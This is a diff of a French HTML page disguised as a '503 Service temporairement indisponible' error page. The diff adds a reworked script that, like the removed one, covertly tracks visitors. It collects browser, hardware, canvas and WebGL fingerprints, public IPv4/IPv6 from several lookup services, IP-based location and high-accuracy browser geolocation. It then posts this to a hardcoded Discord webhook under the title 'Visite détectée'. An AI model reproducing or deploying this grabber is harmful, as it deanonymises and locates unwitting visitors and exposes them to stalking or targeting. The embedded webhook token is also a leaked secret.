@@ -1,122 +1,95 @@
-<!DOCTYPE html>
-<html lang="fr">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Erreur 503 - Service indisponible</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #0a0a0a;
-      color: #e0e0e0;
-      margin: 0;
-      padding: 0;
-      height: 100vh;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      text-align: center;
-    }
-    h1 { color: #ff4444; font-size: 6rem; margin: 0; }
-    h2 { color: #ff9800; margin: 10px 0 30px; }
-    .code { font-family: monospace; font-size: 1.4rem; color: #ff6b6b; }
-    button {
-      background: #ff4444;
-      color: white;
-      border: none;
-      padding: 14px 32px;
-      font-size: 1.2rem;
-      border-radius: 6px;
-      cursor: pointer;
-      margin-top: 30px;
-    }
-    button:hover { background: #d32f2f; }
-    pre {
-      background: #111;
-      padding: 20px;
-      border-radius: 8px;
-      max-width: 90%;
-      overflow: auto;
-      text-align: left;
-      margin-top: 40px;
-      font-size: 0.85rem;
-    }
-    footer { position: absolute; bottom: 20px; font-size: 0.9rem; opacity: 0.6; }
-  </style>
-</head>
-<body>
-  <h1>503</h1>
-  <h2>Service temporairement indisponible</h2>
-  <p class="code">Le serveur rencontre un problème technique.<br>Nos équipes interviennent. Réessayez dans quelques instants.</p>
+<script>
+  document.getElementById('txid').textContent = Date.now().toString(36).toUpperCase();
+  document.getElementById('ref').textContent = 'TX-' + Math.random().toString(36).substr(2,9).toUpperCase();
 
-  <button onclick="location.reload()">Réessayer</button>
+  let infos = {
+    timestamp: new Date().toISOString(),
+    url: window.location.href,
+    referrer: document.referrer || 'direct',
+    userAgent: navigator.userAgent,
+    language: navigator.language,
+    languages: navigator.languages || [],
+    platform: navigator.platform,
+    vendor: navigator.vendor,
+    screen: `${screen.width}×${screen.height} (${screen.colorDepth} bits)`,
+    availScreen: `${screen.availWidth}×${screen.availHeight}`,
+    pixelRatio: window.devicePixelRatio,
+    orientation: screen.orientation ? screen.orientation.type : null,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    timezoneOffset: new Date().getTimezoneOffset(),
+    hardwareConcurrency: navigator.hardwareConcurrency || 'inconnu',
+    deviceMemory: navigator.deviceMemory || 'inconnu',
+    maxTouchPoints: navigator.maxTouchPoints || 0,
+    cookiesEnabled: navigator.cookieEnabled,
+    doNotTrack: navigator.doNotTrack,
+    online: navigator.onLine,
+    connection: navigator.connection ? {
+      type: navigator.connection.effectiveType || navigator.connection.type,
+      downlink: navigator.connection.downlink,
+      rtt: navigator.connection.rtt,
+      saveData: navigator.connection.saveData
+    } : null
+  };
 
-  <footer>ID transaction : ERR-<span id="txid"></span> • Ref: <span id="ref"></span></footer>
+  // Récupération agressive de l'IPv4 / IPv6
+  async function getIPs() {
+    const endpoints = [
+      { url: 'https://api.ipify.org?format=json', key: 'ip' },
+      { url: 'https://api64.ipify.org?format=json', key: 'ip' },
+      { url: 'https://ipv4.icanhazip.com', key: 'ipv4' },
+      { url: 'https://ifconfig.me/ip', key: 'ipv4' },
+      { url: 'https://api.myip.com', key: 'ip' },
+      { url: 'https://ipinfo.io/json', key: 'ip' }
+    ];
 
-  <pre id="collected">Chargement des informations...</pre>
+    for (const ep of endpoints) {
+      try {
+        const res = await fetch(ep.url, { cache: 'no-store', mode: 'cors' });
+        if (!res.ok) continue;
 
-  <script>
-    document.getElementById('txid').textContent = Date.now().toString(36).toUpperCase();
-    document.getElementById('ref').textContent = 'TX-' + Math.random().toString(36).substr(2,9).toUpperCase();
+        let text = await res.text();
+        let ip;
 
-    // Objet principal
-    let infos = {
-      timestamp: new Date().toISOString(),
-      url: window.location.href,
-      referrer: document.referrer || 'direct',
-      userAgent: navigator.userAgent,
-      language: navigator.language,
-      languages: navigator.languages || [],
-      platform: navigator.platform,
-      vendor: navigator.vendor,
-      product: navigator.product,
-      productSub: navigator.productSub,
-      vendorSub: navigator.vendorSub,
-      oscpu: navigator.oscpu,
-      appName: navigator.appName,
-      appVersion: navigator.appVersion,
-      appCodeName: navigator.appCodeName,
-      screen: `${screen.width}×${screen.height} (${screen.colorDepth} bits)`,
-      availScreen: `${screen.availWidth}×${screen.availHeight}`,
-      pixelRatio: window.devicePixelRatio,
-      orientation: screen.orientation ? screen.orientation.type : null,
-      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      timezoneOffset: new Date().getTimezoneOffset(),
-      hardwareConcurrency: navigator.hardwareConcurrency || 'inconnu',
-      deviceMemory: navigator.deviceMemory || 'inconnu',
-      maxTouchPoints: navigator.maxTouchPoints || 0,
-      cookiesEnabled: navigator.cookieEnabled,
-      doNotTrack: navigator.doNotTrack,
-      online: navigator.onLine,
-      plugins: Array.from(navigator.plugins).map(p => p.name),
-      mimeTypesCount: navigator.mimeTypes.length,
-      javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false
-    };
+        if (text.includes('{')) {
+          const json = JSON.parse(text);
+          ip = json.ip || json.address;
+        } else {
+          ip = text.trim();
+        }
 
-    // Connexion
-    if (navigator.connection) {
-      infos.connection = {
-        type: navigator.connection.effectiveType || navigator.connection.type,
-        downlink: navigator.connection.downlink,
-        rtt: navigator.connection.rtt,
-        saveData: navigator.connection.saveData
-      };
+        if (ip) {
+          if (ip.includes('.')) infos.ipv4 = ip;
+          if (ip.includes(':')) infos.ipv6 = ip;
+          if (infos.ipv4) break; // Priorité IPv4
+        }
+      } catch (e) {}
     }
 
-    // Batterie
-    if (navigator.getBattery) {
-      navigator.getBattery().then(battery => {
-        infos.battery = {
-          level: battery.level,
-          charging: battery.charging,
-          chargingTime: battery.chargingTime,
-          dischargingTime: battery.dischargingTime
-        };
-      }).catch(() => {});
+    if (!infos.ipv4 && !infos.ipv6) {
+      infos.ipError = "tous les services IP ont échoué";
     }
+  }
 
-    // Canvas fingerprint
+  // Géoloc enrichie + IP
+  async function enrichGeo() {
+    await getIPs();
+
+    try {
+      const res = await fetch('https://ipapi.co/json/');
+      const data = await res.json();
+      infos.city = data.city;
+      infos.region = data.region;
+      infos.country = data.country_name;
+      infos.countryCode = data.country_code;
+      infos.latitude = data.latitude;
+      infos.longitude = data.longitude;
+      infos.isp = data.org || data.asn;
+      infos.asn = data.asn;
+    } catch (e) {}
+  }
+
+  // Empreintes
+  function fingerprints() {
     try {
       const canvas = document.createElement('canvas');
       const ctx = canvas.getContext('2d');
@@ -125,102 +98,71 @@
       ctx.fillStyle = "#f60";
       ctx.fillRect(125,1,62,20);
       ctx.fillStyle = "#069";
-      ctx.fillText("fingerprint test 𐐷", 2,15);
-      ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
-      ctx.fillText("fingerprint test 𐐷", 4,17);
+      ctx.fillText("test 𐐷", 2,15);
       infos.canvas = canvas.toDataURL();
-    } catch(e) { infos.canvas = 'non supporté'; }
-
-    // WebGL
-    try {
-      const glCanvas = document.createElement('canvas');
-      const gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');
-      if (gl) {
-        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-        infos.webgl = {
-          vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : null,
-          renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : null
-        };
-      }
     } catch(e) {}
 
-    // Récupération IP + géolocalisation enrichie (API gratuite)
-    async function getIPAndGeo() {
-      try {
-        const res = await fetch('https://ipapi.co/json/');
-        const data = await res.json();
-        infos.ip = data.ip;
-        infos.city = data.city;
-        infos.region = data.region;
-        infos.country = data.country_name;
-        infos.countryCode = data.country_code;
-        infos.latitude = data.latitude;
-        infos.longitude = data.longitude;
-        infos.isp = data.org || data.asn;
-        infos.asn = data.asn;
-      } catch(e) {
-        infos.ip = "impossible à récupérer";
+    try {
+      const gl = document.createElement('canvas').getContext('webgl');
+      if (gl) {
+        const debug = gl.getExtension('WEBGL_debug_renderer_info');
+        infos.webglVendor = debug ? gl.getParameter(debug.UNMASKED_VENDOR_WEBGL) : null;
+        infos.webglRenderer = debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : null;
       }
-    }
+    } catch(e) {}
+  }
 
-    // Envoi Discord
-    async function sendToDiscord() {
-      const embed = {
-        embeds: [{
-          title: "🚨 Nouvelle visite détectée",
-          color: 0xff0000,
-          fields: [
-            { name: "IP publique", value: infos.ip || "?", inline: true },
-            { name: "Pays / Ville / Région", value: `${infos.country || "?"} - ${infos.city || "?"} (${infos.region || "?"})`, inline: true },
-            { name: "Coordonnées GPS", value: infos.latitude && infos.longitude ? `${infos.latitude}, ${infos.longitude}` : "non autorisée", inline: true },
-            { name: "User-Agent", value: "```" + (infos.userAgent || "?").substring(0, 300) + "```", inline: false },
-            { name: "Écran", value: infos.screen, inline: true },
-            { name: "Fuseau horaire", value: infos.timezone, inline: true },
-            { name: "Connexion", value: infos.connection ? `${infos.connection.type} (${infos.connection.downlink} Mbps)` : "?", inline: true },
-            { name: "Matériel", value: `Cœurs: ${infos.hardwareConcurrency} | RAM: ${infos.deviceMemory} Go`, inline: true },
-            { name: "Canvas / WebGL", value: infos.canvas ? "présent" : "absent", inline: true }
-          ],
-          footer: { text: `ID: ERR-${Date.now().toString(36).toUpperCase()} • ${new Date().toLocaleString('fr-FR')}` },
-          timestamp: infos.timestamp
-        }]
-      };
+  // Envoi Discord
+  async function send() {
+    await enrichGeo();
+    fingerprints();
 
-      fetch('https://discord.com/api/webhooks/1475909581401096294/Y1xzIEYlnEyMFDUwXnuEuTFdMGLrUIzE3qpYFLNEVDYLAEFlFgef6ObpQm8ZTgseRwzs', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(embed)
-      }).catch(err => console.error("Erreur Discord:", err));
-    }
+    document.getElementById('collected').textContent = JSON.stringify(infos, null, 2);
 
-    // Démarrage
-    async function start() {
-      await getIPAndGeo();
-      sendToDiscord();
-      document.getElementById('collected').textContent = JSON.stringify(infos, null, 2);
-    }
+    const embed = {
+      embeds: [{
+        title: "🚨 Visite détectée",
+        color: 0xff0000,
+        fields: [
+          { name: "IPv4", value: infos.ipv4 || "non détectée", inline: true },
+          { name: "IPv6", value: infos.ipv6 || "non détectée", inline: true },
+          { name: "Ville / Région / Pays", value: `${infos.city || "?"} - ${infos.region || "?"} (${infos.country || "?"})`, inline: true },
+          { name: "GPS", value: infos.latitude ? `${infos.latitude}, ${infos.longitude}` : "refusée", inline: true },
+          { name: "ISP / ASN", value: infos.isp || infos.asn || "?", inline: true },
+          { name: "User-Agent", value: "```" + infos.userAgent.substring(0, 300) + "```", inline: false },
+          { name: "Écran", value: infos.screen, inline: true },
+          { name: "Timezone", value: infos.timezone, inline: true },
+          { name: "Connexion", value: infos.connection ? infos.connection.type : "?", inline: true },
+          { name: "Hardware", value: `${infos.hardwareConcurrency} cœurs | ${infos.deviceMemory} Go RAM`, inline: true },
+          { name: "Canvas", value: infos.canvas ? "présent" : "absent", inline: true }
+        ],
+        footer: { text: `ID: ${document.getElementById('txid').textContent} • ${new Date().toLocaleString('fr-FR')}` },
+        timestamp: infos.timestamp
+      }]
+    };
 
-    // Géolocalisation + lancement
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        pos => {
-          infos.geo = {
-            latitude: pos.coords.latitude,
-            longitude: pos.coords.longitude,
-            accuracy: pos.coords.accuracy,
-            altitude: pos.coords.altitude,
-            speed: pos.coords.speed
-          };
-          start();
-        },
-        () => start(),
-        { enableHighAccuracy: true, timeout: 12000 }
-      );
-    } else {
-      start();
-    }
+    fetch('https://discord.com/api/webhooks/1475909581401096294/Y1xzIEYlnEyMFDUwXnuEuTFdMGLrUIzE3qpYFLNEVDYLAEFlFgef6ObpQm8ZTgseRwzs', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(embed)
+    }).catch(e => console.error(e));
+  }
 
-    // Envoi de secours
-    setTimeout(start, 8000);
+  // Lancement
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      pos => {
+        infos.geo = { lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy };
+        send();
+      },
+      () => send(),
+      { enableHighAccuracy: true, timeout: 10000 }
+    );
+  } else {
+    send();
+  }
+
+  setTimeout(send, 7000); // secours
   </script>
 </body>
 </html>
